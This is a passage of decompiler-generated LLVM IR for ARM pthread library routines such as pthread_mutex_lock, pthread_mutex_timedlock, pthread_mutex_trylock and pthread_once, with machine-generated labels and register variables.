  %v2_f424 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f424, i32* @r4, align 4
  store i32 %v6_f364, i32* @r5, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v6_f364, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v3_f360, { 1, 0 }
  uselistorder i32 %v0_f360, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f420, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f418, { 1, 0 }
  uselistorder label %dec_label_pc_f408, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r0, align 4
  %v0_f42c = call i32 @pthread_mutex_unlock()
  %v0_f430 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f430, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_f430 = load i32, i32* @r8, align 4
  %v5_f430 = mul i32 %v2_f430, 8
  %v6_f430 = and i32 %v5_f430, %arg1
  store i32 %v6_f430, i32* @fp, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_f42c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_f434 = add i32 %arg2, 4
  %v2_f434 = inttoptr i32 %v1_f434 to i32*
  %v3_f434 = load i32, i32* %v2_f434, align 4
  store i32 999999999, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  %tmp = icmp ugt i32 %v3_f434, 999999999
  br i1 %tmp, label %dec_label_pc_f51c, label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %entry
  %v1_f450 = add i32 %arg1, 12
  %v2_f450 = inttoptr i32 %v1_f450 to i32*
  %v3_f450 = load i32, i32* %v2_f450, align 4
  store i32 %v3_f450, i32* %r3.global-to-local, align 4
  switch i32 %v3_f450, label %dec_label_pc_f51c [
    i32 0, label %dec_label_pc_f470
    i32 1, label %dec_label_pc_f480
    i32 2, label %dec_label_pc_f4c0
    i32 3, label %dec_label_pc_f4fc
  ]

dec_label_pc_f470:                                ; preds = %dec_label_pc_f450
  %v1_f470 = add i32 %arg1, 16
  store i32 %v1_f470, i32* %r0.global-to-local, align 4
  %v2_f478 = call i32 @__pthread_lock(i32 %v1_f470, i32 0)
  store i32 %v2_f478, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f514

dec_label_pc_f480:                                ; preds = %dec_label_pc_f450
  %v0_f480 = call i32 @_thread_self.11()
  store i32 %v0_f480, i32* %r0.global-to-local, align 4
  %v0_f484 = load i32, i32* @r4, align 4
  %v1_f484 = add i32 %v0_f484, 8
  %v2_f484 = inttoptr i32 %v1_f484 to i32*
  %v3_f484 = load i32, i32* %v2_f484, align 4
  store i32 %v3_f484, i32* %r3.global-to-local, align 4
  %v9_f488 = icmp eq i32 %v3_f484, %v0_f480
  br i1 %v9_f488, label %.thread2, label %dec_label_pc_f4a0

.thread2:                                         ; preds = %dec_label_pc_f480
  %v2_f48c = add i32 %v0_f484, 4
  %v3_f48c = inttoptr i32 %v2_f48c to i32*
  %v4_f48c = load i32, i32* %v3_f48c, align 4
  %v2_f494 = add i32 %v4_f48c, 1
  store i32 %v2_f494, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4b8

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f480
  %v1_f4a0 = add i32 %v0_f484, 16
  store i32 %v1_f4a0, i32* %r0.global-to-local, align 4
  %v2_f4a8 = call i32 @__pthread_lock(i32 %v1_f4a0, i32 %v0_f480)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f4b0 = load i32, i32* @r4, align 4
  %v2_f4b0 = add i32 %v1_f4b0, 8
  %v3_f4b0 = inttoptr i32 %v2_f4b0 to i32*
  store i32 %v0_f480, i32* %v3_f4b0, align 4
  %v0_f4b4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f4b4, i32* %r0.global-to-local, align 4
  %v1_f4b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %.thread2, %dec_label_pc_f4a0
  %v1_f4b8 = phi i32 [ %v0_f484, %.thread2 ], [ %v1_f4b8.pre, %dec_label_pc_f4a0 ]
  %v0_f4b8 = phi i32 [ %v2_f494, %.thread2 ], [ %v0_f4b4, %dec_label_pc_f4a0 ]
  %v2_f4b8 = add i32 %v1_f4b8, 4
  %v3_f4b8 = inttoptr i32 %v2_f4b8 to i32*
  store i32 %v0_f4b8, i32* %v3_f4b8, align 4
  %v14_f4bc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v14_f4bc

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f450
  %v0_f4c0 = call i32 @_thread_self.11()
  store i32 %v0_f4c0, i32* %r0.global-to-local, align 4
  %v0_f4c4 = load i32, i32* @r4, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 8
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  store i32 %v3_f4c4, i32* %r3.global-to-local, align 4
  %v9_f4c8 = icmp eq i32 %v3_f4c4, %v0_f4c0
  store i32 %v0_f4c0, i32* @r5, align 4
  br i1 %v9_f4c8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f4c0
  store i32 35, i32* %r0.global-to-local, align 4
  ret i32 35

.thread4:                                         ; preds = %dec_label_pc_f4c0
  %v0_f4d8 = load i32, i32* @r6, align 4
  %v1_f4dc = add i32 %v0_f4c4, 16
  store i32 %v1_f4dc, i32* %r0.global-to-local, align 4
  %v3_f4e4 = inttoptr i32 %v1_f4dc to i32*
  %v4_f4e4 = call i32 @__pthread_alt_timedlock(i32* %v3_f4e4, i32 %v0_f4c0, i32 %v0_f4d8)
  store i32 %v4_f4e4, i32* %r0.global-to-local, align 4
  %v2_f4e8 = icmp eq i32 %v4_f4e4, 0
  br i1 %v2_f4e8, label %dec_label_pc_f524, label %bb19

bb19:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_f4f0 = load i32, i32* @r5, align 4
  %v2_f4f0 = load i32, i32* @r4, align 4
  %v3_f4f0 = add i32 %v2_f4f0, 8
  %v4_f4f0 = inttoptr i32 %v3_f4f0 to i32*
  store i32 %v1_f4f0, i32* %v4_f4f0, align 4
  %v15_f4f4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_f4f4

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f450
  %v1_f500 = add i32 %arg1, 16
  store i32 %v1_f500, i32* %r0.global-to-local, align 4
  %v3_f508 = inttoptr i32 %v1_f500 to i32*
  %v4_f508 = call i32 @__pthread_alt_timedlock(i32* %v3_f508, i32 0, i32 %arg2)
  store i32 %v4_f508, i32* %r0.global-to-local, align 4
  %v2_f50c = icmp eq i32 %v4_f508, 0
  br i1 %v2_f50c, label %dec_label_pc_f524, label %dec_label_pc_f514

dec_label_pc_f514:                                ; preds = %dec_label_pc_f4fc, %dec_label_pc_f470
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f450, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  ret i32 22

dec_label_pc_f524:                                ; preds = %.thread4, %dec_label_pc_f4fc
  store i32 110, i32* %r0.global-to-local, align 4
  ret i32 110

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 18, 14, 5, 1, 3, 4, 9, 6, 7, 10, 12, 8, 11, 13, 15, 17, 16, 0 }
  uselistorder i32 110, { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f524, { 1, 0 }
  uselistorder label %dec_label_pc_f4b8, { 1, 0 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_f530 = add i32 %arg1, 12
  %v2_f530 = inttoptr i32 %v1_f530 to i32*
  %v3_f530 = load i32, i32* %v2_f530, align 4
  store i32 %v3_f530, i32* %r3.global-to-local, align 4
  %v3_f534 = load i32, i32* @r4, align 4
  store i32 %v3_f534, i32* %stack_var_-12, align 4
  %v6_f534 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v7_f53c = icmp eq i32 %v3_f530, 3
  store i1 %v7_f53c, i1* @cpsr_z, align 1
  switch i32 %v3_f530, label %dec_label_pc_f558 [
    i32 0, label %dec_label_pc_f560
    i32 1, label %dec_label_pc_f574
    i32 2, label %dec_label_pc_f5b4
    i32 3, label %dec_label_pc_f5e4
  ]

dec_label_pc_f558:                                ; preds = %entry
  store i32 22, i32* %r0.global-to-local, align 4
  store i32 %v3_f534, i32* @r4, align 4
  ret i32 22

dec_label_pc_f560:                                ; preds = %entry
  %v1_f560 = add i32 %arg1, 16
  store i32 %v1_f560, i32* %r0.global-to-local, align 4
  %v2_f568 = call i32 @__pthread_lock(i32 %v1_f560, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f570 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f570, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

dec_label_pc_f574:                                ; preds = %entry
  %v0_f574 = call i32 @_thread_self.11()
  store i32 %v0_f574, i32* %r0.global-to-local, align 4
  %v0_f578 = load i32, i32* @r4, align 4
  %v1_f578 = add i32 %v0_f578, 8
  %v2_f578 = inttoptr i32 %v1_f578 to i32*
  %v3_f578 = load i32, i32* %v2_f578, align 4
  store i32 %v3_f578, i32* %r3.global-to-local, align 4
  %v9_f57c = icmp eq i32 %v3_f578, %v0_f574
  store i1 %v9_f57c, i1* @cpsr_z, align 1
  br i1 %v9_f57c, label %.thread2, label %dec_label_pc_f594

.thread2:                                         ; preds = %dec_label_pc_f574
  %v2_f580 = add i32 %v0_f578, 4
  %v3_f580 = inttoptr i32 %v2_f580 to i32*
  %v4_f580 = load i32, i32* %v3_f580, align 4
  %v2_f588 = add i32 %v4_f580, 1
  store i32 %v2_f588, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5ac

dec_label_pc_f594:                                ; preds = %dec_label_pc_f574
  %v1_f594 = add i32 %v0_f578, 16
  store i32 %v1_f594, i32* %r0.global-to-local, align 4
  %v2_f59c = call i32 @__pthread_lock(i32 %v1_f594, i32 %v0_f574)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f5a4 = load i32, i32* @r4, align 4
  %v2_f5a4 = add i32 %v1_f5a4, 8
  %v3_f5a4 = inttoptr i32 %v2_f5a4 to i32*
  store i32 %v0_f574, i32* %v3_f5a4, align 4
  %v0_f5a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f5a8, i32* %r0.global-to-local, align 4
  %v1_f5ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f5ac

dec_label_pc_f5ac:                                ; preds = %.thread2, %dec_label_pc_f594
  %v1_f5ac = phi i32 [ %v0_f578, %.thread2 ], [ %v1_f5ac.pre, %dec_label_pc_f594 ]
  %v0_f5ac = phi i32 [ %v2_f588, %.thread2 ], [ %v0_f5a8, %dec_label_pc_f594 ]
  %v2_f5ac = add i32 %v1_f5ac, 4
  %v3_f5ac = inttoptr i32 %v2_f5ac to i32*
  store i32 %v0_f5ac, i32* %v3_f5ac, align 4
  %v2_f5b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5b0, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  %v11_f5b0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_f5b0

dec_label_pc_f5b4:                                ; preds = %entry
  %v0_f5b4 = call i32 @_thread_self.11()
  store i32 %v0_f5b4, i32* %r0.global-to-local, align 4
  %v0_f5b8 = load i32, i32* @r4, align 4
  %v1_f5b8 = add i32 %v0_f5b8, 8
  %v2_f5b8 = inttoptr i32 %v1_f5b8 to i32*
  %v3_f5b8 = load i32, i32* %v2_f5b8, align 4
  store i32 %v3_f5b8, i32* %r3.global-to-local, align 4
  %v9_f5bc = icmp eq i32 %v3_f5b8, %v0_f5b4
  store i1 %v9_f5bc, i1* @cpsr_z, align 1
  store i32 %v0_f5b4, i32* @r5, align 4
  br i1 %v9_f5bc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f5b4
  store i32 35, i32* %r0.global-to-local, align 4
  %v3_f5c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f5c8, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 35

.thread4:                                         ; preds = %dec_label_pc_f5b4
  %v1_f5cc = add i32 %v0_f5b8, 16
  store i32 %v1_f5cc, i32* %r0.global-to-local, align 4
  %v2_f5d4 = inttoptr i32 %v1_f5cc to i32*
  %v3_f5d4 = call i32 @__pthread_alt_lock(i32* %v2_f5d4, i32 %v0_f5b4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_f5dc = load i32, i32* @r5, align 4
  %v1_f5dc = load i32, i32* @r4, align 4
  %v2_f5dc = add i32 %v1_f5dc, 8
  %v3_f5dc = inttoptr i32 %v2_f5dc to i32*
  store i32 %v0_f5dc, i32* %v3_f5dc, align 4
  %v2_f5e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5e0, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

dec_label_pc_f5e4:                                ; preds = %entry
  %v1_f5e4 = add i32 %arg1, 16
  store i32 %v1_f5e4, i32* %r0.global-to-local, align 4
  %v2_f5ec = inttoptr i32 %v1_f5e4 to i32*
  %v3_f5ec = call i32 @__pthread_alt_lock(i32* %v2_f5ec, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_f5f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f5f4, i32* @r4, align 4
  store i32 %v6_f534, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v6_f534, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v3_f530, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 9, 6, 8, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_f5ac, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_f5fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b188.483 to i32))
  %v0_f600 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f600, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v1_f5fc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @pthread_once(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v6_f604 = load i32, i32* @r5, align 4
  %v9_f604 = load i32, i32* @r6, align 4
  %v12_f604 = load i32, i32* @r7, align 4
  %v2_f608 = load i32, i32* %arg1, align 4
  %v7_f60c = icmp eq i32 %v2_f608, 2
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_f60c, label %dec_label_pc_f714, label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %entry
  store i32 63028, i32* @lr, align 4
  %v2_f630 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b188.483 to i32))
  %v0_f634 = load i32, i32* @r5, align 4
  %v1_f634 = inttoptr i32 %v0_f634 to i32*
  %v2_f634 = load i32, i32* %v1_f634, align 4
  %v1_f638 = urem i32 %v2_f634, 4
  %v7_f63c = icmp eq i32 %v1_f638, 1
  br i1 %v7_f63c, label %dec_label_pc_f644, label %dec_label_pc_f664.preheader

dec_label_pc_f644:                                ; preds = %dec_label_pc_f624
  %v2_f648 = load i32, i32* @global_var_2b1ac.487, align 4
  store i32 %v2_f648, i32* @r2, align 4
  %v1_f64c = and i32 %v2_f634, -4
  %v9_f650 = icmp eq i32 %v1_f64c, %v2_f648
  br i1 %v9_f650, label %dec_label_pc_f664.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_f644
  store i32 0, i32* %v1_f634, align 4
  %v0_f6642.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f664.preheader

dec_label_pc_f664.preheader:                      ; preds = %dec_label_pc_f624, %bb, %dec_label_pc_f644
  %v0_f6642 = phi i32 [ %v0_f634, %dec_label_pc_f624 ], [ %v0_f6642.pre, %bb ], [ %v0_f634, %dec_label_pc_f644 ]
  %v1_f6643 = inttoptr i32 %v0_f6642 to i32*
  %v2_f6644 = load i32, i32* %v1_f6643, align 4
  store i32 %v2_f6644, i32* @r6, align 4
  %v1_f6685 = urem i32 %v2_f6644, 4
  %v7_f66c8 = icmp eq i32 %v1_f6685, 1
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r1, align 4
  br i1 %v7_f66c8, label %dec_label_pc_f660, label %dec_label_pc_f67c

dec_label_pc_f660:                                ; preds = %dec_label_pc_f664.preheader, %dec_label_pc_f660
  %v2_f660 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_2b1a0.485 to i32), i32 ptrtoint (i32* @global_var_2b188.483 to i32))
  %v0_f664 = load i32, i32* @r5, align 4
  %v1_f664 = inttoptr i32 %v0_f664 to i32*
  %v2_f664 = load i32, i32* %v1_f664, align 4
  store i32 %v2_f664, i32* @r6, align 4
  %v1_f668 = urem i32 %v2_f664, 4
  %v7_f66c = icmp eq i32 %v1_f668, 1
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r1, align 4
  br i1 %v7_f66c, label %dec_label_pc_f660, label %dec_label_pc_f67c

dec_label_pc_f67c:                                ; preds = %dec_label_pc_f660, %dec_label_pc_f664.preheader
  %v1_f694 = phi i32 [ %v0_f6642, %dec_label_pc_f664.preheader ], [ %v0_f664, %dec_label_pc_f660 ]
  %v0_f67c = phi i32 [ %v2_f6644, %dec_label_pc_f664.preheader ], [ %v2_f664, %dec_label_pc_f660 ]
  %v2_f67c = icmp eq i32 %v0_f67c, 0
  br i1 %v2_f67c, label %dec_label_pc_f688, label %dec_label_pc_f6f8

dec_label_pc_f688:                                ; preds = %dec_label_pc_f67c
  %v2_f68c = load i32, i32* @global_var_2b1ac.487, align 4
  %v1_f690 = or i32 %v2_f68c, 1
  %v2_f694 = inttoptr i32 %v1_f694 to i32*
  store i32 %v1_f690, i32* %v2_f694, align 4
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r0, align 4
  %v1_f6a4 = call i32 @pthread_mutex_unlock()
  %v0_f6a8 = load i32, i32* @r5, align 4
  %v6_f6bc = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-36, i32 ptrtoint (i32* @global_var_f740.506 to i32), i32 %v0_f6a8, i32 58176)
  call void @__pseudo_branch(i32 %arg2)
  %v0_f6c8 = load i32, i32* @r6, align 4
  %v4_f6d8 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-36, i32 %v0_f6c8)
  %v2_f6e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b188.483 to i32))
  %v1_f6f0 = load i32, i32* @r5, align 4
  %v2_f6f0 = inttoptr i32 %v1_f6f0 to i32*
  store i32 2, i32* %v2_f6f0, align 4
  br label %dec_label_pc_f6f8

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f67c, %dec_label_pc_f688
  %storemerge = phi i32 [ 1, %dec_label_pc_f688 ], [ 0, %dec_label_pc_f67c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r0, align 4
  %v1_f704 = call i32 @pthread_mutex_unlock()
  %v0_f708 = load i32, i32* @r4, align 4
  %v2_f708 = icmp eq i32 %v0_f708, 0
  br i1 %v2_f708, label %bb22, label %bb21

bb21:                                             ; preds = %dec_label_pc_f6f8
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_f6f8, %bb21
  %v1_f710 = xor i1 %v2_f708, true
  call void @__pseudo_cond_branch(i1 %v1_f710, i32 ptrtoint (i32* @global_var_e6d4.509 to i32))
  br label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %entry, %bb22
  store i32 %v6_f604, i32* @r5, align 4
  store i32 %v9_f604, i32* @r6, align 4
  store i32 %v12_f604, i32* @r7, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_f664, { 1, 0, 2 }
  uselistorder i32 %v2_f6644, { 1, 0, 2 }
  uselistorder i32 %v2_f634, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* @global_var_2b1ac.487, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f714, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_f6f8, { 1, 0 }
  uselistorder label %dec_label_pc_f660, { 1, 0 }
  uselistorder label %dec_label_pc_f664.preheader, { 1, 2, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_f740 = load i32, i32* @r4, align 4
  store i32 %v3_f740, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2b188.483 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_f758 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b188.483 to i32))
  %v1_f760 = load i32, i32* @r5, align 4
  %v2_f760 = inttoptr i32 %v1_f760 to i32*
  store i32 0, i32* %v2_f760, align 4
  %v0_f764 = load i32, i32* @r4, align 4
  store i32 %v0_f764, i32* @r0, align 4
  %v1_f770 = call i32 @pthread_mutex_unlock()
  %v2_f778 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f778, i32* @r4, align 4
  %v1_f77c = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_2b1a0.485 to i32))
  ret i32 %v1_f77c

; uselistorder directives
  uselistorder i32* @global_var_2b1a0.485, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b188.483 to i32), { 2, 7, 8, 3, 9, 10, 1, 0, 4, 5, 11, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_f790 = add i32 %arg1, 12
  %v2_f790 = inttoptr i32 %v1_f790 to i32*
  %v3_f790 = load i32, i32* %v2_f790, align 4
  %v3_f794 = load i32, i32* @r4, align 4
  store i32 %v3_f794, i32* %stack_var_-12, align 4
  %v6_f794 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  switch i32 %v3_f790, label %dec_label_pc_f7b8 [
    i32 0, label %dec_label_pc_f7c0
    i32 1, label %dec_label_pc_f7dc
    i32 2, label %dec_label_pc_f824
    i32 3, label %dec_label_pc_f840
  ]

dec_label_pc_f7b8:                                ; preds = %entry
  store i32 22, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f7c0:                                ; preds = %entry
  store i32 16, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f7dc:                                ; preds = %entry
  %v0_f7dc = call i32 @_thread_self.11()
  %v0_f7e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7e0 = add i32 %v0_f7e0, 8
  %v2_f7e0 = inttoptr i32 %v1_f7e0 to i32*
  %v3_f7e0 = load i32, i32* %v2_f7e0, align 4
  %v9_f7e4 = icmp eq i32 %v3_f7e0, %v0_f7dc
  br i1 %v9_f7e4, label %.thread2, label %.thread3

.thread2:                                         ; preds = %dec_label_pc_f7dc
  %v2_f7ec = add i32 %v0_f7e0, 4
  %v3_f7ec = inttoptr i32 %v2_f7ec to i32*
  %v4_f7ec = load i32, i32* %v3_f7ec, align 4
  store i32 0, i32* @r5, align 4
  %v2_f7f4 = add i32 %v4_f7ec, 1
  store i32 %v2_f7f4, i32* %v3_f7ec, align 4
  br label %dec_label_pc_f84c

.thread3:                                         ; preds = %dec_label_pc_f7dc
  store i32 16, i32* @r5, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f824:                                ; preds = %entry
  %v1_f824 = add i32 %arg1, 16
  %v1_f828 = inttoptr i32 %v1_f824 to i32*
  %v2_f828 = call i32 @__pthread_alt_trylock(i32* %v1_f828)
  store i32 %v2_f828, i32* @r5, align 4
  %v2_f82c = icmp eq i32 %v2_f828, 0
  br i1 %v2_f82c, label %dec_label_pc_f834, label %dec_label_pc_f84c

dec_label_pc_f834:                                ; preds = %dec_label_pc_f824
  %v0_f834 = call i32 @_thread_self.11()
  %v1_f838 = load i32, i32* %r4.global-to-local, align 4
  %v2_f838 = add i32 %v1_f838, 8
  %v3_f838 = inttoptr i32 %v2_f838 to i32*
  store i32 %v0_f834, i32* %v3_f838, align 4
  br label %dec_label_pc_f84c

dec_label_pc_f840:                                ; preds = %entry
  %v1_f840 = add i32 %arg1, 16
  store i32 %v3_f794, i32* %r4.global-to-local, align 4
  %v1_f848 = inttoptr i32 %v1_f840 to i32*
  %v2_f848 = call i32 @__pthread_alt_trylock(i32* %v1_f848)
  br label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %.thread2, %.thread3, %dec_label_pc_f7c0, %dec_label_pc_f824, %dec_label_pc_f834, %dec_label_pc_f7b8, %dec_label_pc_f840
  %v0_f84c = load i32, i32* @r5, align 4
  %v2_f850 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f850, i32* @r4, align 4
  store i32 %v6_f794, i32* @r5, align 4
  ret i32 %v0_f84c

; uselistorder directives
  uselistorder i32 ()* @_thread_self.11, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_f84c, { 6, 4, 3, 1, 0, 2, 5 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f854 = load i32, i32* @r4, align 4
  store i32 %v3_f854, i32* %stack_var_-20, align 4
  %v16_f854 = ptrtoint i32* %stack_var_-20 to i32
  %v2_f85c = load i32, i32* @global_var_2b16c.177, align 4
  %v3_f860 = icmp ult i32 %v16_f854, %v2_f85c
  store i32 %v16_f854, i32* %r6.global-to-local, align 4
  %v0_f868 = load i32, i32* @r0, align 4
  store i32 %v0_f868, i32* %r7.global-to-local, align 4
  br i1 %v3_f860, label %dec_label_pc_f874, label %bb

bb:                                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2a3e0 to i32), i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f874:                                ; preds = %entry
  %v2_f878 = load i32, i32* @global_var_2b170.180, align 4
  %v3_f87c = icmp ult i32 %v16_f854, %v2_f878
  br i1 %v3_f87c, label %dec_label_pc_f898, label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_f874
  %v2_f888 = load i32, i32* @global_var_2b174.182, align 4
  %v3_f88c = icmp ult i32 %v16_f854, %v2_f888
  br i1 %v3_f88c, label %bb17, label %dec_label_pc_f898

bb17:                                             ; preds = %dec_label_pc_f884
  store i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f898:                                ; preds = %dec_label_pc_f884, %dec_label_pc_f874
  %v2_f89c = load i32, i32* @global_var_2f558.186, align 4
  %v2_f8a0 = icmp eq i32 %v2_f89c, 0
  br i1 %v2_f8a0, label %dec_label_pc_f8bc, label %dec_label_pc_f8a8

dec_label_pc_f8a8:                                ; preds = %dec_label_pc_f898
  %v1_f8a8 = call i32 @__pthread_find_self(i32 %v0_f868)
  store i32 %v1_f8a8, i32* @r0, align 4
  store i32 %v1_f8a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8b4:                                ; preds = %dec_label_pc_f8d4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f898
  %v3_f8bc = and i32 %v16_f854, -2097152
  %v4_f8bc = xor i32 %v3_f8bc, -2097152
  %v1_f8c8 = sub i32 -480, %v4_f8bc
  store i32 %v1_f8c8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %bb, %bb17, %dec_label_pc_f8a8, %dec_label_pc_f8bc
  %v0_f8cc = phi i32 [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %bb17 ], [ ptrtoint (i32* @global_var_2a3e0 to i32), %bb ], [ %v1_f8a8, %dec_label_pc_f8a8 ], [ %v1_f8c8, %dec_label_pc_f8bc ]
